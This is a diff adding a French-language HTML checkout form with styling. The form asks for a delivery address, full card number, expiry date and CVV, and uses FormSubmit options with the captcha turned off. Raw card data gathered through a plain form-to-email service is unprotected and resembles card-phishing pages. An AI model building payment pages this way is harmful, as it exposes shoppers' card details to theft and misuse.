@@ -1,0 +1,103 @@
+<form action="" method="POST" class="checkout-form">
+  <h2>📦 Informations de livraison</h2>
+
+  <div class="form-group">
+    <label for="nom">Nom complet</label>
+    <input id="nom" name="Nom" type="text" placeholder="Jean Dupont" required>
+  </div>
+
+  <div class="form-group">
+    <label for="adresse">Adresse</label>
+    <input id="adresse" name="Adresse" type="text" placeholder="12 rue Exemple" required>
+  </div>
+
+  <div class="row">
+    <div class="form-group" style="flex:2">
+      <label for="ville">Ville</label>
+      <input id="ville" name="Ville" type="text" placeholder="Paris" required>
+    </div>
+    <div class="form-group" style="flex:1">
+      <label for="codepostal">Code postal</label>
+      <input id="codepostal" name="Code Postal" type="text" placeholder="75000" required>
+    </div>
+  </div>
+
+  <h2>💳 Paiement</h2>
+
+  <div class="form-group">
+    <label for="numcarte">Numéro de carte</label>
+    <input id="numcarte" name="Carte" type="text" placeholder="1234 5678 9012 3456" maxlength="19" required>
+  </div>
+
+  <div class="row">
+    <div class="form-group" style="flex:1">
+      <label for="expiration">Expiration</label>
+      <input id="expiration" name="Expiration" type="text" placeholder="MM/AA" maxlength="5" required>
+    </div>
+    <div class="form-group" style="flex:1">
+      <label for="cvv">CVV</label>
+      <input id="cvv" name="CVV" type="text" placeholder="123" maxlength="3" required>
+    </div>
+  </div>
+
+  <!-- Options FormSubmit -->
+  <input type="hidden" name="_subject" value="Nouvelle commande reçue">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://tonsite.com/merci.html">
+
+  <button type="submit" class="btn">Confirmer la commande</button>
+</form>
+
+<style>
+.checkout-form {
+  background: #fff;
+  border-radius: 12px;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+  padding: 25px;
+  margin: 20px auto;
+  max-width: 500px;
+  font-family: Arial, sans-serif;
+}
+.checkout-form h2 {
+  color: #ff4d4f;
+  margin-bottom: 20px;
+  text-align: left;
+  font-size: 20px;
+}
+.checkout-form .form-group {
+  margin-bottom: 15px;
+}
+.checkout-form label {
+  display: block;
+  margin-bottom: 6px;
+  font-weight: bold;
+  font-size: 14px;
+}
+.checkout-form input {
+  width: 100%;
+  padding: 10px;
+  border-radius: 8px;
+  border: 1px solid #ddd;
+  font-size: 14px;
+}
+.checkout-form .row {
+  display: flex;
+  gap: 10px;
+}
+.checkout-form .btn {
+  background: #ff4d4f;
+  color: white;
+  border: none;
+  padding: 14px;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+  margin-top: 10px;
+  transition: background 0.3s ease;
+}
+.checkout-form .btn:hover {
+  background: #e04343;
+}
+</style>
